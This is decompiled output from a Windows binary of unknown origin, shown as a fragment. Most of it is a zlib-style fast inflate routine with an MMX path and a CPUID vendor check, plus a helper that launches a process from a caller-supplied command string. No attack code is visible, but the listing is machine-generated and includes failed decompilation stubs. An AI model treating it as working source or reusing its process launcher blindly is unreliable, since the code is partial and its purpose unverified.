    v8 = 0;
    memset(&v101[v15], 0, 12 - v15);
    v14 = 0;
    v13 = v101;
    v99 = v101;
  }
  v17 = v107;
  while ( dword_68206000 != 2 )
  {
    if ( dword_68206000 > 2 )
    {
      while ( 1 )
      {
        if ( v12 <= 0xFu )
        {
          v31 = *v13;
          v13 = (v13 + 2);
          v32 = v12;
          LOBYTE(v12) = v12 + 16;
          v11 |= v31 << v32;
        }
        for ( i = *(v96 + 4 * (v11 & v94)); ; i = *(v96 + 4 * (v34 + (v11 & ((1 << i) - 1)))) )
        {
          LOBYTE(v12) = v12 - BYTE1(i);
          v11 >>= SBYTE1(i);
          if ( !i )
          {
            *v17++ = BYTE2(i);
            goto LABEL_22;
          }
          v34 = i >> 16;
          if ( i & 0x10 )
            break;
          if ( i & 0x40 )
            goto LABEL_97;
        }
        v35 = i & 0xF;
        if ( i & 0xF )
        {
          if ( v12 < v35 )
          {
            v36 = i & 0xF;
            v37 = *v13;
            v13 = (v13 + 2);
            v38 = v12;
            LOBYTE(v12) = v12 + 16;
            v11 |= v37 << v38;
            v35 = v36;
          }
          LOBYTE(v12) = v12 - v35;
          v39 = v11 & ((1 << v35) - 1);
          v11 >>= v35;
          v34 += v39;
        }
        v100 = v34;
        if ( v12 <= 0xFu )
        {
          v40 = *v13;
          v13 = (v13 + 2);
          v41 = v12;
          LOBYTE(v12) = v12 + 16;
          v11 |= v40 << v41;
        }
        for ( j = *(v97 + 4 * (v11 & v95)); ; j = *(v97 + 4 * (v43 + (v11 & ((1 << j) - 1)))) )
        {
          v43 = j >> 16;
          LOBYTE(v12) = v12 - BYTE1(j);
          v11 >>= SBYTE1(j);
          if ( j & 0x10 )
            break;
          if ( j & 0x40 )
            goto LABEL_96;
        }
        v44 = j & 0xF;
        if ( j & 0xF )
          break;
        if ( v43 != 1 || v102 == v17 )
          goto LABEL_38;
        v53 = v17 - 1;
        v54 = *v53;
        v53[1] = *v53;
        v53[2] = v54;
        v53[3] = v54;
        v53 += 4;
        memset(v53, v54, v100 - 3);
        v17 = &v53[v100 - 3];
LABEL_22:
        if ( v98 <= v17 || v99 <= v13 )
          goto LABEL_104;
      }
      if ( v12 < v44 )
      {
        v45 = j & 0xF;
        v46 = *v13;
        v13 = (v13 + 2);
        v47 = v12;
        LOBYTE(v12) = v12 + 16;
        v11 |= v46 << v47;
        v44 = v45;
      }
      LOBYTE(v12) = v12 - v44;
      v48 = v11 & ((1 << v44) - 1);
      v11 >>= v44;
      v43 += v48;
LABEL_38:
      v103 = v13;
      if ( v17 - v102 < v43 )
      {
        if ( v105 < v43 )
          goto LABEL_100;
        v55 = v43 + v102 - v17;
        if ( v104 )
        {
          if ( v55 <= v104 )
          {
            v56 = &v106[v104 - v55];
            v57 = v100;
            if ( v100 > v55 )
            {
              v57 = v100 - v55;
              qmemcpy(v17, v56, v55);
              v17 += v55;
              v56 = &v17[-v43];
            }
          }
          else
          {
            v56 = &v106[v105 + v104 - v55];
            v58 = v55 - v104;
            v57 = v100;
            if ( v100 > v58 )
            {
              v57 = v100 - v58;
              qmemcpy(v17, v56, v58);
              v17 += v58;
              v56 = v106;
              v59 = v104;
              if ( v57 > v104 )
              {
                v57 -= v104;
                qmemcpy(v17, v106, v104);
                v17 += v59;
                v56 = &v17[-v43];
              }
            }
          }
        }
        else
        {
          v56 = &v106[v105 - v55];
          v57 = v100;
          if ( v100 > v55 )
          {
            v57 = v100 - v55;
            qmemcpy(v17, v56, v55);
            v17 += v55;
            v56 = &v17[-v43];
          }
        }
        qmemcpy(v17, v56, v57);
        v17 += v57;
        v13 = v103;
      }
      else
      {
        v49 = &v17[-v43];
        *v17 = v17[-v43];
        v50 = v17[-v43 + 1];
        v51 = v17[-v43 + 2];
        v17[1] = v50;
        v17[2] = v51;
        v52 = v17 + 3;
        qmemcpy(v52, (v49 + 3), v100 - 3);
        v17 = &v52[v100 - 3];
        v13 = v103;
      }
      goto LABEL_22;
    }
    v93 = v8;
    v92 = v12;
    v91 = v14;
    v90 = v10;
    v18 = __readeflags();
    v19 = v18;
    __writeeflags(v18 ^ 0x200000);
    v20 = __readeflags();
    if ( v19 == v20 )
      goto LABEL_113;
    _EAX = 0;
    __asm { cpuid }
    if ( _EBX != 1970169159 )
      goto LABEL_113;
    if ( _ECX != 1818588270 )
      goto LABEL_113;
    if ( _EDX != 1231384169 )
      goto LABEL_113;
    _EAX = 1;
    __asm { cpuid }
    if ( ((_EAX >> 8) & 0xF) != 6 )
      goto LABEL_113;
    if ( _EDX & 0x800000 )
      dword_68206000 = 2;
    else
LABEL_113:
      dword_68206000 = 3;
    v10 = v90;
    v14 = v91;
    v12 = v92;
    v8 = v93;
  }
  _m_femms();
  a1 = _mm_cvtsi32_si64(v11);
  v11 = v12;
  v60 = _mm_cvtsi32_si64(v94);
  v61 = v60;
  v62 = _mm_cvtsi32_si64(v95);
  v63 = v62;
  a2.m64_u64 = 0i64;
  v12 = v96;
  while ( 2 )
  {
    a1 = _m_psrlq(a1, a2);
    if ( v11 <= 0x20 )
    {
      v64 = _mm_cvtsi32_si64(*v13);
      ++v13;
      v65 = _m_psllqi(v64, v11);
      v11 += 32;
      a1 = _m_por(a1, v65);
    }
    v66 = _mm_cvtsi64_si32(_m_pand(v60, a1));
    v60 = v61;
    for ( i = *(v12 + 4 * v66); ; i = *(v12 + 4 * (v67 + (dword_681FC64C[i & 0xF] & _mm_cvtsi64_si32(a1)))) )
    {
      a2 = _mm_cvtsi32_si64(BYTE1(i));
      v11 -= BYTE1(i);
      if ( !i )
      {
        *v17++ = BYTE2(i);
        goto LABEL_64;
      }
      v67 = i >> 16;
      if ( i & 0x10 )
        break;
      if ( i & 0x40 )
      {
LABEL_97:
        if ( i & 0x20 )
        {
          v84 = 0;
          v85 = 11;
        }
        else
        {
          v84 = "invalid literal/length code";
          v85 = 26;
        }
        goto LABEL_101;
      }
      a1 = _m_psrlq(a1, a2);
    }
    v68 = i & 0xF;
    if ( v68 )
    {
      a1 = _m_psrlq(a1, a2);
      a2 = _mm_cvtsi32_si64(v68);
      v11 -= v68;
      v67 += dword_681FC64C[v68] & _mm_cvtsi64_si32(a1);
    }
    a1 = _m_psrlq(a1, a2);
    if ( v11 <= 0x20 )
    {
      v69 = _mm_cvtsi32_si64(*v13);
      ++v13;
      v70 = _m_psllqi(v69, v11);
      v11 += 32;
      a1 = _m_por(a1, v70);
    }
    v71 = _mm_cvtsi64_si32(_m_pand(v62, a1));
    v62 = v63;
    for ( k = *(v97 + 4 * v71); ; k = *(v97 + 4 * (v12 + (dword_681FC64C[k & 0xF] & _mm_cvtsi64_si32(a1)))) )
    {
      v12 = k >> 16;
      v11 -= BYTE1(k);
      a2 = _mm_cvtsi32_si64(BYTE1(k));
      if ( k & 0x10 )
        break;
      if ( k & 0x40 )
      {
LABEL_96:
        v84 = "invalid distance code";
        v85 = 26;
        goto LABEL_101;
      }
      a1 = _m_psrlq(a1, a2);
    }
    v73 = k & 0xF;
    if ( v73 )
    {
      a1 = _m_psrlq(a1, a2);
      a2 = _mm_cvtsi32_si64(v73);
      v11 -= v73;
      v12 += dword_681FC64C[v73] & _mm_cvtsi64_si32(a1);
    }
    else if ( v12 == 1 && v102 != v17 )
    {
      v78 = v17 - 1;
      v79 = *v78;
      v78[1] = *v78;
      v78[2] = v79;
      v78[3] = v79;
      v78 += 4;
      memset(v78, v79, v67 - 3);
      v17 = &v78[v67 - 3];
      v12 = v96;
      goto LABEL_64;
    }
    v103 = v13;
    if ( v17 - v102 >= v12 )
    {
      v74 = v67 - 3;
      *v17 = v17[-v12];
      v75 = v17[-v12 + 2];
      v76 = &v17[-v12 + 3];
      v17[1] = v17[-v12 + 1];
      v17[2] = v75;
      v77 = v17 + 3;
      qmemcpy(v77, v76, v74);
      v17 = &v77[v74];
      v13 = v103;
      v12 = v96;
      goto LABEL_64;
    }
    if ( v105 < v12 )
    {
LABEL_100:
      v13 = v103;
      v84 = "invalid distance too far back";
      v85 = 26;
LABEL_101:
      if ( v84 )
        *(a3 + 24) = v84;
      **(a3 + 28) = v85;
      break;
    }
    v80 = v12 + v102 - v17;
    if ( v104 )
    {
      if ( v80 <= v104 )
      {
        v81 = &v106[v104 - v80];
        if ( v67 > v80 )
        {
          v67 -= v80;
          qmemcpy(v17, v81, v80);
          v17 += v80;
          v81 = &v17[-v12];
        }
      }
      else
      {
        v81 = &v106[v105 + v104 - v80];
        v82 = v80 - v104;
        if ( v67 > v82 )
        {
          v67 -= v82;
          qmemcpy(v17, v81, v82);
          v17 += v82;
          v81 = v106;
          v83 = v104;
          if ( v67 > v104 )
          {
            v67 -= v104;
            qmemcpy(v17, v106, v104);
            v17 += v83;
            v81 = &v17[-v12];
          }
        }
      }
    }
    else
    {
      v81 = &v106[v105 - v80];
      if ( v67 > v80 )
      {
        v67 -= v80;
        qmemcpy(v17, v81, v80);
        v17 += v80;
        v81 = &v17[-v12];
      }
    }
    qmemcpy(v17, v81, v67);
    v17 += v67;
    v13 = v103;
    v12 = v96;
LABEL_64:
    if ( v98 > v17 && v99 > v13 )
      continue;
    break;
  }
LABEL_104:
  if ( dword_68206000 == 2 )
    v12 = v11;
  result = a3;
  v87 = *(a3 + 28);
  v88 = v13 - (v12 >> 3);
  v89 = v12 - 8 * (v12 >> 3);
  *(a3 + 12) = v17;
  *(v87 + 60) = v89;
  if ( v99 == v101 )
  {
    v88 = *a3 + v88 - v101;
    v99 = (*(a3 + 4) - 11 + *a3);
  }
  *a3 = v88;
  if ( dword_68206000 == 2 )
  {
    v11 = _mm_cvtsi64_si32(_m_psrlq(a1, a2));
    _m_femms();
  }
  *(v87 + 56) = ((1 << v89) - 1) & v11;
  *(a3 + 4) = &v99[-v88 + 11];
  *(a3 + 16) = v98 - v17 + 257;
  __writeeflags(v108);
  return result;
}
// 681FC64C: using guessed type int dword_681FC64C[];
// 68206000: using guessed type int dword_68206000;
// 681FC6D0: using guessed type char var_38[12];

//----- (68206440) --------------------------------------------------------
#error "68206456: positive sp value has been found (funcsize=10)"

//----- (682065C0) --------------------------------------------------------
int __cdecl sub_682065C0(int a1)
{
  int v2; // [esp+0h] [ebp-54h]
  int v3; // [esp+4h] [ebp-50h]
  int v4; // [esp+44h] [ebp-10h]
  int v5; // [esp+48h] [ebp-Ch]
  int v6; // [esp+4Ch] [ebp-8h]
  int v7; // [esp+50h] [ebp-4h]

  sub_68206670(&v2, 0, 0x44u);
  v4 = 0;
  v5 = 0;
  v6 = 0;
  v7 = 0;
  return MEMORY[0x10002008](0, a1, 0, 0, 0, 16, 0, 0, &v2, &v4, 68, v3);
}
// 10002008: using guessed type int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (68206610) --------------------------------------------------------
#error "68206635: positive sp value has been found (funcsize=13)"

//----- (68206670) --------------------------------------------------------
unsigned __int8 *__cdecl sub_68206670(unsigned __int8 *a1, unsigned __int8 a2, unsigned int a3)
{
  unsigned int v3; // edx
  int v4; // eax
  unsigned __int8 *v5; // edi
  int v6; // ecx
  unsigned int v7; // ecx
  unsigned int v8; // ecx

  v3 = a3;
  if ( !a3 )
    return a1;
  LOBYTE(v4) = a2;
  if ( !a2 && a3 >= 0x80 && MEMORY[0x10003324] )
    JUMPOUT(&loc_68206A51);
  v5 = a1;
  if ( a3 < 4 )
    goto LABEL_17;
  v6 = -a1 & 3;
  if ( v6 )
  {
    v3 = a3 - v6;
    do
    {
      *v5++ = a2;
      --v6;
    }
    while ( v6 );
  }
  v4 = 16843009 * a2;
  v7 = v3;
  v3 &= 3u;
  v8 = v7 >> 2;
  if ( !v8 || (memset32(v5, v4, v8), v5 += 4 * v8, v3) )
  {
LABEL_17:
    do
    {
      *v5++ = v4;
      --v3;
    }
    while ( v3 );
  }
  return a1;
}

//----- (682066F0) --------------------------------------------------------
#error "68206770: switch analysis failed: switch information is incomplete or incorrect (funcsize=158)"

#error "There were 3 decompilation failure(s) on 175 function(s)"
